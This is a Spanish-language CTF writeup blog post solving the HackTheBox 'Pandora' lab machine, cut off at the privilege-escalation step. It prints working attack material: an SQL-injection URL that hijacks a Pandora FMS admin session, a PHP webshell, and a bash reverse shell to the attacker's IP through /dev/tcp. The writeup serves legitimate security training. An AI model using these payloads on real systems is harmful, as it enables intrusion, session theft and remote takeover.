<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox Pandora Writeup" /><meta name="author" content="V0id" /><meta property="og:locale" content="en" /><meta name="description" content="Sinopsis Pandora es una máquina fácil de HackTheBox creado por TheCyberGeek y dmw0ng." /><meta property="og:description" content="Sinopsis Pandora es una máquina fácil de HackTheBox creado por TheCyberGeek y dmw0ng." /><link rel="canonical" href="https://v0idpy.github.io/posts/hackthebox-pandora-writeup/" /><meta property="og:url" content="https://v0idpy.github.io/posts/hackthebox-pandora-writeup/" /><meta property="og:site_name" content="v0id" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-29T18:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox Pandora Writeup" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@V0id" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"V0id"},"dateModified":"2022-05-31T15:12:18+02:00","datePublished":"2022-05-29T18:00:00+02:00","description":"Sinopsis Pandora es una máquina fácil de HackTheBox creado por TheCyberGeek y dmw0ng.","headline":"HackTheBox Pandora Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://v0idpy.github.io/posts/hackthebox-pandora-writeup/"},"url":"https://v0idpy.github.io/posts/hackthebox-pandora-writeup/"}</script><title>HackTheBox Pandora Writeup | v0id</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="v0id"><meta name="application-name" content="v0id"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/images/luffy-kid.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">v0id</a></div><div class="site-subtitle font-italic">Cybersecurity Analyst - Penetration Tester - CTF Writeups.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/v0idpy" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.linkedin.com/in/christianmanalo/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['cmanibo32','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox Pandora Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="../../../assets/img/htb/easy/pandora/pandora_img.png" class="preview-img bg" alt="Pandora" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>HackTheBox Pandora Writeup</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/v0idpy">V0id</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1653840000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-29 </em> </span> <span> Updated <em class="timeago" data-ts="1654002738" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-31 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1689 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><h2 id="sinopsis"><span class="mr-2">Sinopsis</span><a href="#sinopsis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Pandora es una máquina fácil de HackTheBox creado por <a href="https://app.hackthebox.com/users/114053">TheCyberGeek</a> y <a href="https://app.hackthebox.com/users/610173">dmw0ng</a>.</p><p>Enumerando el servicio <code class="language-plaintext highlighter-rouge">SNMP</code> encontraremos credenciales que nos permitirá entrar en la máquina usando <code class="language-plaintext highlighter-rouge">SSH</code>. Para el movimiento lateral explotaremos <code class="language-plaintext highlighter-rouge">Pandora FMS</code> que corre por un puerto interno. Con <code class="language-plaintext highlighter-rouge">SQLi</code> robaremos las cookies del usuario <code class="language-plaintext highlighter-rouge">admin</code> para autenticarnos y subiendo un archivo malicioso conseguiremos ejecución remota de comandos <code class="language-plaintext highlighter-rouge">RCE</code>. Para la escalada de privilegios utilizaremos un binario con <code class="language-plaintext highlighter-rouge">SUID</code> y con un <code class="language-plaintext highlighter-rouge">Path Hijacking</code> conseguiremos ser ROOT.</p><h2 id="enumeración"><span class="mr-2">Enumeración</span><a href="#enumeración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Usando <code class="language-plaintext highlighter-rouge">nmap</code> haciendo un escaneo <code class="language-plaintext highlighter-rouge">TCP SYN port scan</code> encontraremos SSH y un Apache.</p><h3 id="nmap-tcp-syn-port-scan"><span class="mr-2">Nmap TCP SYN Port Scan</span><a href="#nmap-tcp-syn-port-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre># Nmap 7.92 scan initiated Sun May 29 19:02:50 2022 as: nmap -p22,80 -sCV -oN targeted 10.10.11.136
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 29 19:02:59 2022 -- 1 IP address (1 host up) scanned in 8.52 seconds
</pre></table></code></div></div><h3 id="servidor-web"><span class="mr-2">Servidor Web</span><a href="#servidor-web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Con el comando <code class="language-plaintext highlighter-rouge">whatweb</code> miramos la tecnología que se utiliza.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>❯ whatweb http://10.10.11.136
http://10.10.11.136 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[contact@panda.htb,example@yourmail.com,support@panda.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.136], Open-Graph-Protocol[website], Script, Title[Play | Landing], probably WordPress, X-UA-Compatible[IE=edge]
</pre></table></code></div></div><p>En el comando anterior vemos un apartado de <code class="language-plaintext highlighter-rouge">Email</code>. Añadimos <code class="language-plaintext highlighter-rouge">panda.htb</code> en el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> por un posible virtual hosting.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>❯ sudo echo "10.10.11.136 panda.htb" &gt;&gt; /etc/hosts
</pre></table></code></div></div><p>He intentado hacer fuzzing para encontrar posibles rutas existentes pero adelanto que no hay nada, tampoco he encontrado virtual hosting. La página web se muestra igual poniendo <code class="language-plaintext highlighter-rouge">http://10.10.11.136</code> o <code class="language-plaintext highlighter-rouge">http://panda.htb</code></p><p><img data-src="../../../assets/img/htb/easy/pandora/web.png" alt="pagina-web" data-proofer-ignore> <img data-src="../../../assets/img/htb/easy/pandora/web2.png" alt="pagina-web2" data-proofer-ignore></p><h3 id="nmap-udp-port-scan"><span class="mr-2">Nmap UDP Port Scan</span><a href="#nmap-udp-port-scan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Volvemos a enumerar los puertos pero esta vez hacemos un escaneo por <code class="language-plaintext highlighter-rouge">UDP</code>, podemos ver el servicio snmp abierto.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre># Nmap 7.92 scan initiated Sun May 29 19:03:16 2022 as: nmap --open -sU --top-ports 100 -v -n -oN udpScan 10.10.11.136
Increasing send delay for 10.10.11.136 from 800 to 1000 due to 11 out of 23 dropped probes since last increase.
Nmap scan report for 10.10.11.136
Host is up (0.042s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun May 29 19:04:52 2022 -- 1 IP address (1 host up) scanned in 96.14 seconds
</pre></table></code></div></div><h3 id="snmp"><span class="mr-2">SNMP</span><a href="#snmp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><strong>Que és SNMP?</strong></p><blockquote><p>El Protocolo simple de administración de red o SNMP es un protocolo de la capa de aplicación que facilita el intercambio de información de administración entre dispositivos de red.</p></blockquote><p>Con el comando <code class="language-plaintext highlighter-rouge">onesixtyone</code> podremos aplicar fuerza bruta para saber la <code class="language-plaintext highlighter-rouge">community string</code> del servicio snmp, <code class="language-plaintext highlighter-rouge">public</code> es válido.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>❯ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.11.136
Scanning 1 hosts, 3217 communities
Cant open hosts file, scanning single host: 10.10.11.136
10.10.11.136 [public] Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
</pre></table></code></div></div><p>Para enumerar el servicio <code class="language-plaintext highlighter-rouge">snmp</code> utilizaremos el comando <code class="language-plaintext highlighter-rouge">snmpwalk</code>. Este comando nos permite detectar un conjunto de variables que están disponibles para leer en un dispositivo individual.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>❯ snmpwalk -v2c -c public 10.10.11.136
[** SNIP **]

HOST-RESOURCES-MIB::hrSWRunParameters.856 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
HOST-RESOURCES-MIB::hrSWRunParameters.870 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
HOST-RESOURCES-MIB::hrSWRunParameters.879 = ""

[** SNIP **]
</pre></table></code></div></div><p>El resultado del comando encontramos el usuario <code class="language-plaintext highlighter-rouge">daniel</code> con la contraseña <code class="language-plaintext highlighter-rouge">HotelBabylon23</code>. Ya tenemos credenciales, vamos a intentar autenticarnos por <code class="language-plaintext highlighter-rouge">SSH</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>❯ ssh daniel@10.10.11.136
daniel@10.10.11.136's password: HotelBabylon23

[** SNIP **]

daniel@pandora:~$ id
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel)

daniel@pandora:~$ hostname -I
10.10.11.136 dead:beef::250:56ff:feb9:bc5e 

daniel@pandora:~$
</pre></table></code></div></div><p>Usando las credenciales obtenidas hemos conseguido entrar en la máquina a través del <code class="language-plaintext highlighter-rouge">SSH</code>. El archivo <code class="language-plaintext highlighter-rouge">user.txt</code> se encuentra en <code class="language-plaintext highlighter-rouge">/home/matt</code> y no tenemos permisos de lectura, asi que el siguiente paso es convertirnos en <code class="language-plaintext highlighter-rouge">matt</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>daniel@pandora:~$ pwd
/home/daniel

daniel@pandora:~$ find / -name user.txt 2&gt; /dev/null
/home/matt/user.txt

daniel@pandora:~$ ls -l /home/matt/user.txt
-rw-r----- 1 root matt 33 May 30 17:27 /home/matt/user.txt

daniel@pandora:~$ cat /home/matt/user.txt
cat: /home/matt/user.txt: Permission denied
</pre></table></code></div></div><h2 id="movimiento-lateral"><span class="mr-2">Movimiento lateral</span><a href="#movimiento-lateral" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Enumerando el sistema podemos encontrar dos carpetas en <code class="language-plaintext highlighter-rouge">/var/www/</code>. Una de ellas pertenece al usuario <code class="language-plaintext highlighter-rouge">matt</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>daniel@pandora:/var/www$ ls -l
total 8
drwxr-xr-x 3 root root 4096 Dec  7 14:32 html
drwxr-xr-x 3 matt matt 4096 Dec  7 14:32 pandora
</pre></table></code></div></div><p>En los archivos de configuración podemos ver que un servicio corriendo internamente en el puerto 80. Aunque pongamos <code class="language-plaintext highlighter-rouge">pandora.panda.htb</code> en nuestro <code class="language-plaintext highlighter-rouge">/etc/hosts</code> no podremos acceder a el. Debemos aplicar un port forwarding.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>daniel@pandora:/var/www$ cat /etc/apache2/sites-available/pandora.conf 
&lt;VirtualHost localhost:80&gt;
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  &lt;Directory /var/www/pandora&gt;
    AllowOverride All
  &lt;/Directory&gt;
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
&lt;/VirtualHost&gt;
daniel@pandora:/var/www$
</pre></table></code></div></div><h2 id="port-forwarding"><span class="mr-2">Port Forwarding</span><a href="#port-forwarding" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>utilizaremos <code class="language-plaintext highlighter-rouge">SSH</code> para hacer el port forwarding, llevaremos el puerto 80 de la máquina hasta nuestro localhost.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>❯ sudo ssh -fN -L 80:127.0.0.1:80 daniel@10.10.11.136
daniel@10.10.11.136's password: HotelBabylon23

❯ nmap localhost
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 22:06 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000086s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 998 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http

Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds
</pre></table></code></div></div><h2 id="explotación"><span class="mr-2">Explotación</span><a href="#explotación" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Ahora que tenemos acceso a la página web es hora de buscar maneras de explotarla. <img data-src="../../../assets/img/htb/easy/pandora/pandora_fms.png" alt="Pandora FMS" data-proofer-ignore></p><p>Como podemos ver en la imagen la versión de este CMS es <code class="language-plaintext highlighter-rouge">v7.0NG.742</code> esta desactualizada y existen varias vulnerablidades. Todo está en este <a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained/">blog</a>.</p><p><img data-src="../../../assets/img/htb/easy/pandora/cve.png" alt="vulnerabilidades" data-proofer-ignore></p><h3 id="sqli"><span class="mr-2">SQLi</span><a href="#sqli" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Lo que mas me llama la atención és esta vulnerablidad porque nos permite coger la cookie de un usuario a través de una <code class="language-plaintext highlighter-rouge">SQLi</code>. <img data-src="../../../assets/img/htb/easy/pandora/sqli.png" alt="vulnsql" data-proofer-ignore></p><p>En github he encontrado dos exploits que nos permite robar la cookie del admin y tener una shell interactiva. <img data-src="../../../assets/img/htb/easy/pandora/github_search.png" alt="github_search" data-proofer-ignore> Analizando el <a href="https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py">exploit</a> podemos ver que hace la siguiente petición.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://{host}/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO
</pre></table></code></div></div><p><img data-src="../../../assets/img/htb/easy/pandora/sqli_exploit.png" alt="sql_payload" data-proofer-ignore> Si recargamos la página nos rederigirá en el panel porque hemos robado la cookie del administrador. <img data-src="../../../assets/img/htb/easy/pandora/panel.png" alt="panel_admin" data-proofer-ignore></p><h3 id="remote-code-execution"><span class="mr-2">Remote Code Execution</span><a href="#remote-code-execution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Desde el panel <code class="language-plaintext highlighter-rouge">Admin Tools &gt; File Manager</code> podremos subir cualquier tipo de archivo, en nuestro caso subiremos una webshell.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>❯ cat pwned.php
&lt;?php
    system($_GET['cmd']);
?&gt;
</pre></table></code></div></div><p><img data-src="../../../assets/img/htb/easy/pandora/webshell.png" alt="upload_webshell" data-proofer-ignore></p><p>Para acceder al archivo solo debemos ir a <code class="language-plaintext highlighter-rouge">http://localhost/pandora_console/images/pwned.php</code> <img data-src="../../../assets/img/htb/easy/pandora/cmd.png" alt="webshell" data-proofer-ignore></p><p>Ya tenemos ejecución remota de comandos, ahora solo queda entrar en la máquina.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://localhost/pandora_console/images/pwned.php?cmd=bash -c 'bash -i &gt;%26 /dev/tcp/10.10.14.41/1234 0&gt;%261'
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>❯ nc -lnvp 1234
Connection from 10.10.11.136:60992
bash: cannot set terminal process group (896): Inappropriate ioctl for device
bash: no job control in this shell
matt@pandora:/var/www/pandora/pandora_console/images$ 
</pre></table></code></div></div><p>Ya podremos visualizar la flag del usuario.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>matt@pandora:/home/matt$ cat user.txt 
ed9411ce557725394fc4ea060392710a
</pre></table></code></div></div><p>Para poder entrar en la máquina por ssh y sin proporcionar contraseña tenemos que crear un par de claves con <code class="language-plaintext highlighter-rouge">ssh-keygen</code> y meter la clave pública en <code class="language-plaintext highlighter-rouge">authorized-keys</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>matt@pandora:/home/matt$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/matt/.ssh/id_rsa): 
Created directory '/home/matt/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/matt/.ssh/id_rsa
Your public key has been saved in /home/matt/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:bj9Tj14jwtmurh1K1RQeFDGrg9/V3flrL3738gqem/8 matt@pandora
The key's randomart image is:
+---[RSA 3072]----+
|           .Bo   |
|           . =   |
|            +    |
|         . +   .+|
|        S + . ..+|
|       . + =..  .|
|        + *.=oo .|
|       o +o=.*+o+|
|        oo==B+=OE|
+----[SHA256]-----+
matt@pandora:/home/matt$ cat .ssh/id_rsa.pub &gt; .ssh/authorized_keys

matt@pandora:/home/matt$ chmod 600 .ssh/authorized_keys
</pre></table></code></div></div><p>Copiamos la clave privada en nuestra máquina para poder autenticarnos en <code class="language-plaintext highlighter-rouge">SSH</code>. <strong>Importante cambiar los permisos</strong>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>❯ chmod 600 matt_idrsa
❯ ssh -i matt_idrsa matt@10.10.11.136

[** SNIP **]

matt@pandora:~$ id
uid=1000(matt) gid=1000(matt) groups=1000(matt)
</pre></table></code></div></div><h2 id="escalada-de-privilegios"><span class="mr-2">Escalada de privilegios</span><a href="#escalada-de-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Enumerando la máquina encontramos los siguientes binarios con permisos <code class="language-plaintext highlighter-rouge">SUID</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>matt@pandora:~$ find / -perm -4000 2&gt; /dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
</pre></table></code></div></div><p>Lo que mas llama la atención es el binario <code class="language-plaintext highlighter-rouge">/usr/bin/pandora_backup</code>. Si lo ejecutamos nos crea un backup.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
